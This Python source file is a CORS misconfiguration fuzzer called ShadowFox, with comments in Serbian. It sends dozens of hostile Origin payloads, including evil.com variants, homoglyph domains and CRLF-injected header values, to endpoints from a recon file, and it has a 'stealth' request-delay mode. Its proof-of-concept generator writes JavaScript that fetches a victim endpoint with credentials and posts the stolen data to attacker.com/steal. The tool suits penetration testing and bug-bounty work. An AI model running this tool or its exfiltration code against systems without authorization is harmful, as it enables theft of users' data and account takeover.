#!/usr/bin/env python3
"""
🦊 SHADOWFOX CORS MISCONFIGURATION FUZZER
Bypass cross-origin zaštite kroz sistemsko testiranje CORS konfiguracija
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import random
from urllib.parse import urlparse, urljoin
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ShadowCorsFuzzer:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "mission_info": {},
            "cors_vulnerabilities": [],
            "tested_endpoints": [],
            "bypass_techniques": [],
            "high_risk_findings": [],
            "statistics": {}
        }
        self.meta_config = {}
        self.recon_data = {}
        
        # CORS bypass payloads - eskalacijske tehnike
        self.origin_payloads = [
            # Wildcard bypasses
            "https://evil.com",
            "https://attacker.com", 
            "https://malicious.com",
            
            # Null origin bypasses
            "null",
            "file://",
            "data:",
            
            # Subdomain bypasses (dinamički se generišu)
            # "https://evil.{target_domain}",
            # "https://{target_domain}.evil.com",
            
            # Protocol bypasses
            "http://evil.com",
            "ftp://evil.com",
            "javascript://evil.com",
            
            # Localhost bypasses
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            
            # Special characters bypasses
            "https://evil.com.",
            "https://evil.com%60",
            "https://evil.com%00",
            "https://evil.com%0d%0a",
            
            # Case sensitivity bypasses
            "HTTPS://EVIL.COM",
            "https://Evil.Com",
            "HtTpS://eViL.cOm",
            
            # Unicode bypasses
            "https://еvil.com",  # Cyrillic е
            "https://evil.com\u0000",
            "https://evil.com\u000d\u000a",
            
            # Multiple origins (comma separation)
            "https://evil.com, https://trusted.com",
            "https://trusted.com, https://evil.com",
            
            # Reflection bypasses
            "https://evil.com\r\nAccess-Control-Allow-Credentials: true",
            "https://evil.com\nSet-Cookie: session=hijacked",
        ]
        
        # Pre-flight bypass techniques
        self.preflight_bypasses = [
            # Metodi koji ne zahtevaju preflight
            {"method": "GET", "headers": {}},
            {"method": "POST", "headers": {"Content-Type": "text/plain"}},
            {"method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
            {"method": "POST", "headers": {"Content-Type": "multipart/form-data"}},
            
            # Custom headers bypass
            {"method": "POST", "headers": {"X-Custom": "bypass"}},
            {"method": "GET", "headers": {"X-Forwarded-For": "127.0.0.1"}},
            {"method": "PUT", "headers": {"Content-Type": "text/plain"}},
        ]
        
    def load_configs(self):
        """Učitavanje Meta config i Recon podataka"""
        try:
            # Meta config
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.results["mission_info"] = self.meta_config
                
            # Recon podaci
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                self.recon_data = json.load(f)
                
            print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
            print(f"🔍 [RECON] Učitano {len(self.recon_data.get('discovered_endpoints', []))} endpoints")
            
        except FileNotFoundError as e:
            print(f"❌ [ERROR] Potreban fajl nije pronađen: {str(e)}")
            print("🔧 [FIX] Pokreni ShadowRecon/shadow_recon.py prvo")
            exit(1)
            
    def setup_session(self):
        """Podešavanje sesije za CORS testiranje"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        self.session.verify = False
        self.session.timeout = 15
        
    def generate_dynamic_origins(self, target_url):
        """Generisanje dinamičkih origin payload-a na osnovu target domain-a"""
        parsed = urlparse(target_url)
        domain = parsed.netloc
        
        dynamic_origins = [
            f"https://evil.{domain}",
            f"https://{domain}.evil.com",
            f"https://evil-{domain}",
            f"https://{domain}-evil.com",
            f"https://sub.{domain}",
            f"https://admin.{domain}",
            f"https://api.{domain}",
            f"https://test.{domain}",
            f"https://{domain}evil.com",
            f"https://evil{domain}",
        ]
        
        return dynamic_origins
        
    def intelligent_delay(self):
        """Pametno kašnjenje za stealth operacije"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0, 1))
            
    def test_cors_endpoint(self, endpoint_url, origin_payload):
        """Testiranje jednog endpoint-a sa određenim Origin payload-om"""
        try:
            self.intelligent_delay()
            
            # Osnovni CORS test
            test_headers = {
                "Origin": origin_payload,
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "X-Custom-Header"
            }
            
            response = self.session.get(endpoint_url, headers=test_headers)
            
            # Analiza CORS header-a
            cors_headers = {
                "access_control_allow_origin": response.headers.get("Access-Control-Allow-Origin"),
                "access_control_allow_credentials": response.headers.get("Access-Control-Allow-Credentials"),
                "access_control_allow_methods": response.headers.get("Access-Control-Allow-Methods"),
                "access_control_allow_headers": response.headers.get("Access-Control-Allow-Headers"),
                "access_control_max_age": response.headers.get("Access-Control-Max-Age"),
            }
            
            # Evaluacija ranjivosti
            vulnerability_level = self.evaluate_cors_vulnerability(origin_payload, cors_headers, response)
            
            test_result = {
                "endpoint": endpoint_url,
                "origin_payload": origin_payload,
                "status_code": response.status_code,
                "cors_headers": cors_headers,
                "vulnerability_level": vulnerability_level,
                "response_size": len(response.content),
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
            self.results["tested_endpoints"].append(test_result)
            
            # Ako je ranjivost pronađena
            if vulnerability_level in ["HIGH", "CRITICAL"]:
                self.log_cors_vulnerability(test_result)
                
            return test_result
            
        except Exception as e:
            print(f"❌ [CORS ERROR] {endpoint_url} | {origin_payload}: {str(e)}")
            return None
            
    def evaluate_cors_vulnerability(self, origin_payload, cors_headers, response):
        """Evaluacija nivoa CORS ranjivosti"""
        allow_origin = cors_headers.get("access_control_allow_origin", "")
        allow_credentials = cors_headers.get("access_control_allow_credentials", "").lower()
        
        # CRITICAL: Wildcard sa credentials
        if allow_origin == "*" and allow_credentials == "true":
            return "CRITICAL"
            
        # HIGH: Reflection origin-a sa credentials
        if allow_origin == origin_payload and allow_credentials == "true":
            return "HIGH"
            
        # HIGH: Wildcard bez credentials ali sa sensitive endpoints
        if allow_origin == "*" and self.is_sensitive_endpoint(response):
            return "HIGH"
            
        # MEDIUM: Reflection origin-a bez credentials
        if allow_origin == origin_payload:
            return "MEDIUM"
            
        # LOW: Partial reflection ili slični domain
        if allow_origin and (origin_payload in allow_origin or allow_origin in origin_payload):
            return "LOW"
            
        # INFO: Samo CORS header prisutan
        if allow_origin:
            return "INFO"
            
        return "NONE"
        
    def is_sensitive_endpoint(self, response):
        """Provera da li endpoint sadrži osetljive podatke"""
        sensitive_keywords = [
            "token", "session", "password", "auth", "api_key", 
            "secret", "private", "admin", "user", "email",
            "credit", "payment", "account", "balance"
        ]
        
        content = response.text.lower()
        return any(keyword in content for keyword in sensitive_keywords)
        
    def log_cors_vulnerability(self, test_result):
        """Logovanje pronađene CORS ranjivosti"""
        vulnerability = {
            "type": "CORS Misconfiguration",
            "severity": test_result["vulnerability_level"],
            "endpoint": test_result["endpoint"],
            "malicious_origin": test_result["origin_payload"],
            "cors_response": test_result["cors_headers"],
            "status_code": test_result["status_code"],
            "exploitation_proof": self.generate_exploitation_proof(test_result),
            "impact": self.assess_impact(test_result),
            "cvss_score": self.calculate_cvss_score(test_result),
            "timestamp": test_result["timestamp"]
        }
        
        self.results["cors_vulnerabilities"].append(vulnerability)
        
        # High-risk dodaj u posebnu kategoriju
        if test_result["vulnerability_level"] in ["HIGH", "CRITICAL"]:
            self.results["high_risk_findings"].append(vulnerability)
            
        print(f"🚨 [VULN FOUND] {test_result['vulnerability_level']} | {test_result['endpoint']}")
        print(f"   Origin: {test_result['origin_payload']}")
        print(f"   ACAO: {test_result['cors_headers']['access_control_allow_origin']}")
        
    def generate_exploitation_proof(self, test_result):
        """Generisanje PoC koda za eksploataciju"""
        origin = test_result["origin_payload"]
        endpoint = test_result["endpoint"]
        
        if test_result["cors_headers"].get("access_control_allow_credentials") == "true":
            poc_code = f"""
// CORS Exploitation PoC - Credentials Included
fetch('{endpoint}', {{
    method: 'GET',
    credentials: 'include',
    headers: {{
        'Origin': '{origin}'
    }}
}})
.then(response => response.text())
.then(data => {{
    console.log('Stolen data:', data);
    // Send to attacker server
    fetch('https://attacker.com/steal', {{
        method: 'POST',
        body: JSON.stringify({{data: data}})
    }});
}});
"""
        else:
            poc_code = f"""
// CORS Exploitation PoC - Basic
fetch('{endpoint}', {{
    method: 'GET',
    headers: {{
        'Origin': '{origin}'
    }}
}})
.then(response => response.text())
.then(data => console.log('Data accessible from malicious origin:', data));
"""
        
        return poc_code.strip()
        
    def assess_impact(self, test_result):
        """Procena uticaja ranjivosti"""
        level = test_result["vulnerability_level"]
        
        impact_map = {
            "CRITICAL": "Complete bypass of same-origin policy with credential access. Full account takeover possible.",
            "HIGH": "Sensitive data exposure from malicious origins. Potential for data theft and privilege escalation.",
            "MEDIUM": "Cross-origin data access without credentials. Information disclosure risk.",
            "LOW": "Limited CORS bypass. Potential for reconnaissance and information gathering.",
            "INFO": "CORS headers present but properly configured."
        }
        
        return impact_map.get(level, "Unknown impact level")
        
    def calculate_cvss_score(self, test_result):
        """CVSS 3.1 score kalkulacija"""
        level = test_result["vulnerability_level"]
        
        cvss_map = {
            "CRITICAL": 9.1,  # AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
            "HIGH": 7.5,      # AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
            "MEDIUM": 5.3,    # AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
            "LOW": 3.7,       # AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N
            "INFO": 0.0
        }
        
        return cvss_map.get(level, 0.0)
        
    def test_preflight_bypasses(self, endpoint_url):
        """Testiranje preflight bypass tehnika"""
        print(f"✈️  [PREFLIGHT] Testiranje: {endpoint_url}")
        
        bypass_results = []
        
        for bypass_technique in self.preflight_bypasses:
            try:
                self.intelligent_delay()
                
                method = bypass_technique["method"]
                headers = bypass_technique["headers"].copy()
                headers["Origin"] = "https://evil.com"
                
                if method == "GET":
                    response = self.session.get(endpoint_url, headers=headers)
                elif method == "POST":
                    response = self.session.post(endpoint_url, headers=headers, data="test=data")
                elif method == "PUT":
                    response = self.session.put(endpoint_url, headers=headers, data="test=data")
                else:
                    response = self.session.request(method, endpoint_url, headers=headers)
                    
                # Analiza odgovora
                acao = response.headers.get("Access-Control-Allow-Origin")
                if acao and (acao == "*" or acao == "https://evil.com"):
                    bypass_result = {
                        "endpoint": endpoint_url,
                        "method": method,
                        "headers": headers,
                        "status_code": response.status_code,
                        "acao_header": acao,
                        "bypass_successful": True,
                        "response_size": len(response.content)
                    }
                    bypass_results.append(bypass_result)
                    self.results["bypass_techniques"].append(bypass_result)
                    
                    print(f"🎯 [BYPASS SUCCESS] {method} | ACAO: {acao}")
                    
            except Exception as e:
                print(f"❌ [PREFLIGHT ERROR] {method}: {str(e)}")
                
        return bypass_results
        
    def run_cors_fuzzing(self):
        """Glavna CORS fuzzing operacija"""
        print("🦊 SHADOWFOX CORS FUZZER - POKRETANJE")
        print("=" * 60)
        
        # 1. Učitaj konfiguracije
        self.load_configs()
        
        # 2. Podesi sesiju
        self.setup_session()
        
        # 3. Pripremi endpoint listu
        endpoints = self.prepare_endpoint_list()
        
        print(f"🎯 [TARGET] Testiranje {len(endpoints)} endpoints")
        print(f"🧪 [PAYLOADS] {len(self.origin_payloads)} origin payloads")
        
        # 4. Testiranje svakog endpoint-a
        total_tests = 0
        
        for endpoint in endpoints[:10]:  # Ograniči na prvih 10 za demo
            endpoint_url = endpoint.get("url", endpoint)
            
            print(f"\n🔍 [TESTING] {endpoint_url}")
            
            # Generiši dinamičke origin-e za ovaj domain
            dynamic_origins = self.generate_dynamic_origins(endpoint_url)
            all_origins = self.origin_payloads + dynamic_origins
            
            # Testiraj svaki origin
            for origin in all_origins:
                self.test_cors_endpoint(endpoint_url, origin)
                total_tests += 1
                
                # Progress indicator
                if total_tests % 10 == 0:
                    print(f"📊 [PROGRESS] {total_tests} testova završeno...")
                    
            # Testiraj preflight bypasses
            self.test_preflight_bypasses(endpoint_url)
            
        # 5. Generiši statistiku
        self.generate_statistics(total_tests)
        
        # 6. Snimi rezultate
        self.save_results()
        
        # 7. Prikaži sažetak
        self.display_summary()
        
    def prepare_endpoint_list(self):
        """Priprema liste endpoint-a za testiranje"""
        endpoints = []
        
        # Iz recon podataka
        discovered_endpoints = self.recon_data.get("discovered_endpoints", [])
        endpoints.extend(discovered_endpoints)
        
        # API endpoints
        api_endpoints = self.recon_data.get("api_endpoints", [])
        endpoints.extend(api_endpoints)
        
        # Dodaj target_root ako nema drugih
        if not endpoints:
            target_root = self.meta_config.get("target_root")
            if target_root:
                endpoints.append({"url": target_root})
                
        return endpoints
        
    def generate_statistics(self, total_tests):
        """Generisanje statistike CORS testiranja"""
        vulnerabilities = self.results["cors_vulnerabilities"]
        
        # Brojanje po severity
        severity_count = {}
        for vuln in vulnerabilities:
            severity = vuln["severity"]
            severity_count[severity] = severity_count.get(severity, 0) + 1
            
        stats = {
            "total_tests_performed": total_tests,
            "total_endpoints_tested": len(set(test["endpoint"] for test in self.results["tested_endpoints"])),
            "vulnerabilities_found": len(vulnerabilities),
            "high_risk_findings": len(self.results["high_risk_findings"]),
            "severity_breakdown": severity_count,
            "bypass_techniques_successful": len(self.results["bypass_techniques"]),
            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "most_vulnerable_endpoints": self.get_most_vulnerable_endpoints()
        }
        
        self.results["statistics"] = stats
        
    def get_most_vulnerable_endpoints(self):
        """Najranjiviji endpoints"""
        endpoint_vulns = {}
        
        for vuln in self.results["cors_vulnerabilities"]:
            endpoint = vuln["endpoint"]
            severity = vuln["severity"]
            
            if endpoint not in endpoint_vulns:
                endpoint_vulns[endpoint] = {"count": 0, "max_severity": "INFO"}
                
            endpoint_vulns[endpoint]["count"] += 1
            
            # Update max severity
            severity_order = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
            current_max = endpoint_vulns[endpoint]["max_severity"]
            if severity_order.get(severity, 0) > severity_order.get(current_max, 0):
                endpoint_vulns[endpoint]["max_severity"] = severity
                
        # Sortiraj po broju ranjivosti i severity
        sorted_endpoints = sorted(
            endpoint_vulns.items(),
            key=lambda x: (x[1]["count"], x[1]["max_severity"]),
            reverse=True
        )
        
        return [{"endpoint": ep, "vulnerabilities": data} for ep, data in sorted_endpoints[:5]]
        
    def save_results(self):
        """Snimanje rezultata u attack_cors_fuzz.json"""
        output_file = "Napad/attack_cors_fuzz.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] Rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz sažetka CORS fuzzing operacije"""
        stats = self.results["statistics"]
        
        print("\n🎯 SHADOWFOX CORS FUZZER - SAŽETAK")
        print("=" * 60)
        print(f"🧪 Ukupno testova: {stats['total_tests_performed']}")
        print(f"🌐 Testirani endpoints: {stats['total_endpoints_tested']}")
        print(f"🚨 Ranjivosti pronađene: {stats['vulnerabilities_found']}")
        print(f"🔥 Visokorizične: {stats['high_risk_findings']}")
        print(f"✈️  Successful bypasses: {stats['bypass_techniques_successful']}")
        
        # Severity breakdown
        if stats['severity_breakdown']:
            print(f"\n📊 SEVERITY BREAKDOWN:")
            for severity, count in stats['severity_breakdown'].items():
                print(f"   {severity}: {count}")
                
        # Najranjiviji endpoints
        if stats['most_vulnerable_endpoints']:
            print(f"\n🎯 NAJRANJIVIJI ENDPOINTS:")
            for item in stats['most_vulnerable_endpoints'][:3]:
                endpoint = item['endpoint']
                vulns = item['vulnerabilities']
                print(f"   {endpoint}")
                print(f"      └─ {vulns['count']} ranjivosti | Max: {vulns['max_severity']}")
                
        print(f"\n✅ Rezultati: Napad/attack_cors_fuzz.json")
        
        # Kritične ranjivosti upozorenje
        if stats['high_risk_findings'] > 0:
            print(f"\n🚨 UPOZORENJE: {stats['high_risk_findings']} visokorizičnih ranjivosti!")
            print("   🔍 Proveri Napad/attack_cors_fuzz.json za PoC kodove")

def main():
    fuzzer = ShadowCorsFuzzer()
    fuzzer.run_cors_fuzzing()

if __name__ == "__main__":
    main()
